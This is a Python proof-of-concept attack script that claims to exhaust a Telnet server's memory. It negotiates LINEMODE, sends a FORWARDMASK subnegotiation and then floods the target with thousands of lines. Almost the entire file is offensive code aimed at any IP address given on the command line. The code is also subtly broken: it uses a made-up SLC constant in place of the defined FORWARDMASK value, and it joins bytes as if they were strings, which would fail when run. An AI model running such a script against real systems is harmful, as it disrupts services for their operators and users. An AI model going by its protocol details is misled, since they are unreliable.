#!/usr/bin/env python3
"""
Proof-of-Concept for FORWARDMASK Buffer Exhaustion in Telnet LINEMODE.

This script demonstrates how an attacker can exhaust server memory by:
1. Negotiating LINEMODE.
2. Sending a FORWARDMASK subnegotiation with a large number of characters.
3. Sending data that matches the mask, forcing the server to buffer excessively.

Reference: RFC 1184 (Telnet Line Mode Option), Section 5.6
"""

import socket
import struct
import sys
import time

# Telnet Command Constants
TELNET_SE = 240  # Subnegotiation End
TELNET_SB = 250  # Subnegotiation Begin
TELNET_WILL = 251
TELNET_WONT = 252
TELNET_DO = 253
TELNET_DONT = 254
TELNET_IAC = 255  # Interpret As Command

# Telnet Option Constants
TELNET_LINEMODE = 37

# LINEMODE Subnegotiation Constants
LM_MODE = 1
LM_SLC = 2
LM_FORWARDMASK = 3

# LINEMODE Modes
LM_MODE_EDIT = 1
LM_MODE_TRIM = 2

# SLC Constants
SLC_FORWARDMASK = 31

# Helper to send Telnet commands
def send_telnet_command(sock, cmd, opt=None):
    """Send a Telnet command, optionally with an option byte."""
    data = struct.pack('B', cmd)
    if opt is not None:
        data += struct.pack('B', opt)
    sock.sendall(data)

def send_iac(sock):
    """Send the Interpret As Command (IAC) byte."""
    sock.sendall(struct.pack('B', TELNET_IAC))

def send_subnegotiation(sock, option, data):
    """Send a Telnet subnegotiation (SB ... SE)."""
    sock.sendall(struct.pack('BB', TELNET_IAC, TELNET_SB))
    sock.sendall(struct.pack('B', option))
    sock.sendall(data)
    sock.sendall(struct.pack('BB', TELNET_IAC, TELNET_SE))

def negotiate_linemode(sock):
    """Negotiate LINEMODE option with the server."""
    print("[*] Negotiating LINEMODE...")
    # Client sends DO LINEMODE
    send_telnet_command(sock, TELNET_DO, TELNET_LINEMODE)
    
    # Wait for server response
    response = sock.recv(1024)
    print(f"[+] Server response: {response}")
    
    # If server sends WILL LINEMODE, we send DO LINEMODE (already sent)
    # If server sends DONT LINEMODE, negotiation failed
    if bytes([TELNET_IAC, TELNET_DONT, TELNET_LINEMODE]) in response:
        print("[-] Server does not support LINEMODE.")
        sys.exit(1)
    
    # Send LINEMODE subnegotiation to set mode to EDIT
    print("[*] Setting LINEMODE to EDIT...")
    lm_data = struct.pack('BB', LM_MODE, LM_MODE_EDIT)
    send_subnegotiation(sock, TELNET_LINEMODE, lm_data)
    
    # Wait for acknowledgment
    time.sleep(0.5)
    sock.recv(1024)
    print("[+] LINEMODE negotiation complete.")

def send_forwardmask(sock, mask_chars):
    """Send a FORWARDMASK subnegotiation with the specified characters."""
    print(f"[*] Sending FORWARDMASK with {len(mask_chars)} characters...")
    # FORWARDMASK subnegotiation: SLC_FORWARDMASK followed by the mask characters
    slc_data = struct.pack('B', SLC_FORWARDMASK) + mask_chars
    send_subnegotiation(sock, TELNET_LINEMODE, slc_data)
    
    # Wait for server response
    time.sleep(0.5)
    try:
        response = sock.recv(1024)
        print(f"[+] Server response to FORWARDMASK: {response}")
    except socket.timeout:
        print("[!] No response from server (may indicate processing or timeout).")

def send_matching_data(sock, mask_chars, num_lines=1000):
    """Send data that matches the FORWARDMASK to trigger buffering."""
    print(f"[*] Sending {num_lines} lines of data matching FORWARDMASK...")
    for i in range(num_lines):
        # Create a line that includes characters from the mask
        line = ''.join(mask_chars) + f"\r\nLine {i}\r\n"
        sock.sendall(line.encode())
        if i % 100 == 0:
            print(f"    Sent {i} lines...")
    print("[+] Data transmission complete.")

def main():
    if len(sys.argv) < 2:
        print("Usage: python poc_FORWARDMASK_Buffer_Exhaustion.py <target_ip> [port]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 23
    
    print(f"[*] Connecting to {target_ip}:{target_port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    
    try:
        sock.connect((target_ip, target_port))
        print("[+] Connected to target.")
        
        # Step 1: Negotiate LINEMODE
        negotiate_linemode(sock)
        
        # Step 2: Craft a large FORWARDMASK
        # Using a large number of control characters to force excessive buffering
        mask_chars = bytes(range(1, 33))  # 32 control characters
        send_forwardmask(sock, mask_chars)
        
        # Step 3: Send data matching the mask
        send_matching_data(sock, mask_chars, num_lines=5000)
        
        print("[*] PoC execution complete. Check server memory usage.")
        
    except socket.error as e:
        print(f"[-] Socket error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
